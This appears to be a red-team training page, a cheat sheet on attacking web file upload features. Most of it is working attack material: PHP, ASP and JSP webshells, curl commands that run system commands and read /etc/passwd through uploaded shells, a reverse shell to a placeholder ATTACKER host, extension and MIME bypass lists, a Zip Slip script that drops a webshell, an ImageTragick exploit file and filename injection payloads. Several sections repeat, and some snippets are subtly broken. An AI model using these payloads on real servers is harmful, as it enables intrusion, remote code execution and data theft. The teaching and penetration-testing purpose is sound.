---
layout: training-page
title: "File Upload Attacks — Red Team Academy"
module: "Web Hacking"
tags:
  - file-upload
  - webshell
  - polyglot
  - bypass
  - rce
page_key: "web-file-upload"
render_with_liquid: false
---

# File Upload Attacks

File upload vulnerabilities allow executing arbitrary code on the server when validation fails. Attack vectors include extension bypass, MIME type spoofing, polyglot files, path traversal in filenames, and server-side processing vulnerabilities (ImageMagick, LibreOffice, FFmpeg). Getting code execution requires both upload and execution.

## Basic Webshell Upload

```
# PHP webshell (cmd parameter):
<?php system($_GET['cmd']); ?>

# PHP webshell (all-in-one):
<?php if(isset($_REQUEST['cmd']){echo"<pre>";$cmd=$_REQUEST['cmd'];system($cmd);echo"</pre>";die;} ?>

# Short PHP variations (bypass content filters):
<?=`$_GET[0]`?>
<?=$_POST[c]?>
<?php echo exec($_POST['c']); ?>

# ASP/ASPX webshell:
<% eval request("cmd") %>
<%@ Page Language="C#"%><%Response.Write(System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo("cmd.exe","/c "+Request["cmd"]){UseShellExecute=false,RedirectStandardOutput=true}).StandardOutput.ReadToEnd());%>

# JSP webshell:
<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>

# After upload — execute:
curl "https://target/uploads/shell.php?cmd=id"
curl "https://target/uploads/shell.php?cmd=cat+/etc/passwd"
curl "https://target/uploads/shell.php" --data "cmd=bash -i >& /dev/tcp/ATTACKER/4444 0>&1"
```

## Extension Bypass Techniques

```
# If .php is blocked, try alternate extensions:
.php2, .php3, .php4, .php5, .php6, .php7
.phtml, .pht, .phps
.pHp, .PHP, .PhP       # case variation
.php.jpg               # double extension (check which end server reads)
.jpg.php               # double extension other way
shell.php%00.jpg       # null byte (old PHP — truncates at null)
shell.php%20           # trailing space
shell.php.             # trailing dot
shell.php::$DATA       # Windows NTFS alternate data stream

# Apache .htaccess upload (if uploadable):
# Upload .htaccess with:
AddType application/x-httpd-php .jpg
# Now .jpg files execute as PHP in that directory

# Nginx misconfiguration (path info):
# Upload: shell.jpg
# Execute: https://target/uploads/shell.jpg/x.php
# (Nginx passes /x.php to FastCGI, executes shell.jpg as PHP)

# IIS misconfiguration — semicolon bypass:
shell.asp;.jpg  # IIS parses as shell.asp
```

## MIME Type Bypass

```
# Server checks Content-Type header — change it in Burp:
# Normal upload sends: Content-Type: application/x-php
# Change to: Content-Type: image/jpeg

# Intercept upload request in Burp:
# 1. Upload shell.php normally
# 2. In Burp Proxy: modify Content-Type to image/jpeg
# 3. Forward → server may accept based on MIME alone

# Magic bytes bypass (if server reads file header):
# JPEG magic bytes: FF D8 FF (prefix webshell with JPEG header)
# PNG magic bytes: 89 50 4E 47
# GIF magic bytes: 47 49 46 38 (GIF89a)

# Prepend magic bytes:
echo -e '\xff\xd8\xff' > shell.php  # JPEG magic bytes
cat shell_content.php >> shell.php

# GIF polyglot (valid GIF + PHP execution):
echo 'GIF89a;<?php system($_GET["cmd"]); ?>' > shell.php
```

## Polyglot Files

Polyglot files are valid in two formats simultaneously — a JPEG that is also valid PHP.

```
# JPEG/PHP polyglot:
exiftool -Comment='<?php echo system($_GET["cmd"]); ?>' shell.jpg
# Rename to shell.php if extension validation is client-side only
# Or use double extension: shell.jpg.php

# GIF polyglot:
printf 'GIF89a\n<?php system($_GET["cmd"]); ?>' > polyglot.gif

# ZIP polyglot (upload a ZIP that is also a valid JAR/WAR):
# If server unzips uploads: craft ZIP containing malicious files
# Zip slip: path traversal in ZIP entries
# Entry name: ../../etc/cron.d/webshell → writes outside upload dir

# Zip Slip attack:
python3 -c "
import zipfile
with zipfile.ZipFile('zipslip.zip', 'w') as z:
    z.write('/dev/null', '../../tmp/shell.php')
    # Actual content: open('shell_content.php').read()
"
```

## Path Traversal in Filename

```
# If server uses user-supplied filename:
# Content-Disposition: form-data; name="file"; filename="../../../var/www/html/shell.php"
# → shell.php written to web root

# URL encoded:
filename=..%2F..%2F..%2Fvar%2Fwww%2Fhtml%2Fshell.php

# Double encoding:
filename=..%252F..%252F..%252Fvar%252Fwww%252Fhtml%252Fshell.php

# Windows path traversal:
filename=..\..\inetpub\wwwroot\shell.aspx

# In Burp: modify filename in multipart body
```

## ImageMagick — ImageTragick (CVE-2016-3714)

```
# ImageMagick processes images server-side — MVG/MSL injection:
# Create malicious SVG:
cat > exploit.svg << 'EOF'
<image authenticate='ff" `id > /tmp/out`;"'>
  <read filename="pdf:/etc/passwd"/>
  <get width="base-width" height="base-height" />
  <resize geometry="400x400" />
  <write filename="test.png" />
  <svg width="700" height="700" xmlns="http://www.w3.org/2000/svg"></svg>
</image>
EOF

# For modern ImageMagick — check for SSRF via URL handler:
# https://hackerone.com/reports/398706
# Pixel push attack (PDF/ghostscript via convert)
```

## Extension Bypass Techniques

Extended extension bypass list from PayloadsAllTheThings covering all major server types.

### PHP Extension Bypasses

```
# Standard PHP alternatives:
.php3  .php4  .php5  .php7  .phtml  .pht  .phps  .phar  .phpt  .pgif  .phtm  .inc

# Null byte (works against pathinfo() — older PHP):
.php%00.gif
.php\x00.gif
.php%00.png
.php\x00.jpg

# Special character tricks:
file.php......      # multiple trailing dots (Windows strips them)
file.php%20         # trailing space
file.php%0d%0a.jpg  # CRLF before extension
file.php%0a         # newline suffix
file.php/           # trailing slash
file.php.\          # dot-backslash

# Right-to-Left Override (RTLO) — displays as .gpj.php visually:
name.%E2%80%AEphp.jpg  # becomes name.gpj.php

# Case variation:
.pHp  .pHP5  .PhAr
```

### ASP / JSP Extension Bypasses

```
# ASP/ASPX server:
.asp  .aspx  .config  .cer  .asa
shell.asp;1.jpg    # IIS < 7.0 — semicolon bypass
shell.aspx;1.jpg
shell.soap         # SOAP endpoint execution

# IIS Windows character conversion (when saving files):
# > (\x3E) → ? (\x3F)
# < (\x3C) → * (\x2A)
# " (\x22) → . (\x2E) — use single quotes in Content-Disposition

# JSP / Java:
.jsp  .jspx  .jsw  .jsv  .jspf  .wss  .do  .actions

# Perl:
.pl  .pm  .cgi  .lib

# Node.js:
.js  .json  .node
```

### Server Configuration Abuse

```
# Apache — upload .htaccess to make .jpg execute as PHP:
AddType application/x-httpd-php .jpg
# Now all .jpg files in this directory execute as PHP

# Nginx misconfiguration (path info):
# Upload: shell.jpg
# Execute: https://target/uploads/shell.jpg/x.php
# Nginx passes /x.php to PHP-FPM, which executes shell.jpg

# IIS — semicolon bypass:
shell.asp;.jpg   # IIS parses as shell.asp
shell.aspx;.png
```

## Magic Byte / MIME Bypass

File identification bypass techniques from PayloadsAllTheThings.

### Magic Bytes Prepend

```
# JPEG magic bytes: \xff\xd8\xff
printf '\xff\xd8\xff' > shell.php
cat webshell_content.php >> shell.php

# PNG magic bytes: \x89PNG\r\n\x1a\n
printf '\x89PNG\r\n\x1a\n' > shell.php
cat webshell.php >> shell.php

# GIF magic bytes (two variants):
echo -n 'GIF87a' > shell.php && cat webshell.php >> shell.php
echo -n 'GIF89a' > shell.php && cat webshell.php >> shell.php
# GIF polyglot — single line:
printf 'GIF89a;<?php system($_GET["cmd"]); ?>' > polyglot.gif
```

### MIME Type Bypass

```
# Change Content-Type in Burp Interceptor:
Content-Type: application/x-php  →  Content-Type: image/jpeg
Content-Type: application/x-php  →  Content-Type: image/gif
Content-Type: application/x-php  →  Content-Type: image/png

# Double Content-Type (set allowed type after malicious type):
Content-Type: application/x-php
Content-Type: image/jpeg

# Content-Type wordlist for fuzzing:
# /usr/share/seclists/Discovery/Web-Content/web-all-content-types.txt
# Relevant PHP-interpreted MIME types:
text/php
text/x-php
application/php
application/x-php
application/x-httpd-php
application/x-httpd-php-source
```

### NTFS Alternate Data Stream (Windows)

```
# ADS colon trick — creates empty file with forbidden ext, editable later:
file.asax:.jpg     # creates empty file.asax, edit with short filename
file.asp::$data    # non-empty ADS stream
file.asp::$data.   # with trailing dot bypass
```

## Upload to RCE Chains

Post-upload exploitation chains and filename vulnerability payloads from PayloadsAllTheThings.

### Filename Injection Payloads

```
# The vulnerability is sometimes in the filename processing, not the file content.

# Time-based SQLi in filename:
poc.js'(select*from(select(sleep(20)))a)+'.extension

# LFI/Path traversal in filename:
image.png../../../../../../../etc/passwd

# XSS in filename (reflected in file listing):
'"><img src=x onerror=alert(document.domain)>.extension

# Command injection in filename:
; sleep 10;
$(sleep 10)
`sleep 10`

# File traversal — writes outside upload directory:
../../../tmp/lol.png
../../../../../../var/www/html/shell.php
```

### PHP Webshell Variants

```
<!-- Standard webshells: -->
<?php system($_GET['cmd']); ?>
<?=`$_GET[0]`?>
<?=$_POST[c]?>

<!-- Alternative PHP script tags (bypass <?php filter): -->
<script language="php">system("id");</script>

<!-- Exiftool webshell injection (JPEG comment): -->
exiftool -Comment='<?php echo system($_GET["cmd"]); ?>' shell.jpg
# Then rename or use double extension: shell.jpg.php

# Check if FFmpeg HLS is used for video processing:
# CVE — FFMpeg HLS allows SSRF via malicious .m3u8 playlist upload
```

### Zip Slip Attack

```
# Create ZIP with path traversal entry:
python3 -c "
import zipfile
with zipfile.ZipFile('zipslip.zip', 'w') as z:
    info = zipfile.ZipInfo('../../var/www/html/shell.php')
    z.writestr(info, '<?php system(\$_GET[\"cmd\"]); ?>')
"
# Upload zipslip.zip — if server extracts without sanitizing filenames:
# shell.php lands in /var/www/html/

# Verify after upload:
curl "https://target/shell.php?cmd=id"
```

## Upload Bypass Techniques Reference

Defensive implementations use multiple layers of validation. Each layer can be bypassed independently — the goal is to find which layers are present and which are absent or broken.

```
# Layer 1: Extension validation bypass
# If only checking file extension (not content), rename:
shell.php → shell.php.jpg         # double extension (end may execute)
shell.php → shell.PhP             # case sensitivity
shell.php → shell.php%00.jpg      # null byte truncation (old PHP/CGI)
shell.php → shell.php%20          # trailing space
shell.php → shell.php.            # trailing dot (Windows strips dot)
shell.php → shell.php::$DATA      # NTFS alternate data stream (Windows)
shell.php → shell.phtml           # alternate PHP extensions
shell.php → shell.php5            # version-specific extensions

# If server uses denylist (block .php):
.php2 .php3 .php4 .php5 .php6 .php7 .phtml .pht
# Or language-specific: .asp .aspx .jsp .jspx .cfm .pl .py .rb

# Layer 2: MIME type (Content-Type) validation bypass
# Content-Type is user-supplied — trivially forged in Burp:
# Change: Content-Type: application/x-php
# To:     Content-Type: image/jpeg

# Layer 3: File signature (magic bytes) validation bypass
# Prepend valid image magic bytes to PHP content:
printf '\xff\xd8\xff\xe0' > bypass.php  # JPEG magic bytes
echo '<?php system($_GET["cmd"]); ?>' >> bypass.php
# File starts with JPEG signature but contains PHP code
# exiftool method:
exiftool -Comment='<?php system($_GET["cmd"]); ?>' legitimate.jpg
mv legitimate.jpg shell.php.jpg

# Layer 4: Content scanning bypass
# If server scans for <?php tag specifically:
# Alternative PHP opening tags (some configs):
# <? (short tags — if short_open_tag = On)
# <%   (ASP-style — if asp_tags = On, very old PHP)
# Alternative shells that avoid "<?php":
# <script language="php">system($_GET['cmd']);</script>  (old PHP)

# Layer 5: Execution path bypass
# Even if upload succeeds, file must be in executable path
# Files stored outside webroot: not directly accessible
# Techniques:
# - Path traversal in filename: ../../var/www/html/shell.php
# - Find alternate upload paths in different modules
# - Use file include to execute the non-webroot shell:
#   ?page=../../../uploads/shell.jpg  (if include() is vulnerable)

# Layer 6: Content-Disposition filename bypass in multipart:
# Some parsers extract filename differently:
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Disposition: form-data; name="file"; filename="shell.php ";
Content-Disposition: form-data; name="file"; filename="shell.php%00.jpg"
Content-Disposition: form-data; name="file"; filename*=utf-8''shell%2Ephp

# Layer 7: File size limits bypass
# If size check occurs before type check — send just enough bytes to pass:
# Minimal PHP webshell: <?=`$_GET[0]`?>  (12 bytes)

# Bypass summary checklist:
# [ ] Try all alternate extensions for the server technology
# [ ] Forge Content-Type header (image/jpeg, image/gif, image/png)
# [ ] Prepend magic bytes for JPEG (\xff\xd8\xff), GIF (GIF89a), PNG
# [ ] Test null byte in filename: shell.php%00.jpg
# [ ] Test double extension: shell.jpg.php, shell.php.jpg
# [ ] Test case variation: shell.PHP, shell.Php
# [ ] Use exiftool to embed payload in image metadata
# [ ] Try path traversal in filename field
# [ ] Test NTFS ADS on Windows targets: shell.php::$DATA
```

## Tools & Resources

- PortSwigger File Upload labs — `portswigger.net/web-security/file-upload`
- exiftool — metadata manipulation
- Burp Suite — modify Content-Type, filename, extension
- PayloadsAllTheThings File Upload — `github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files`
- webshells — `github.com/BlackArch/webshells`
- OWASP File Upload Cheat Sheet — `cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html`
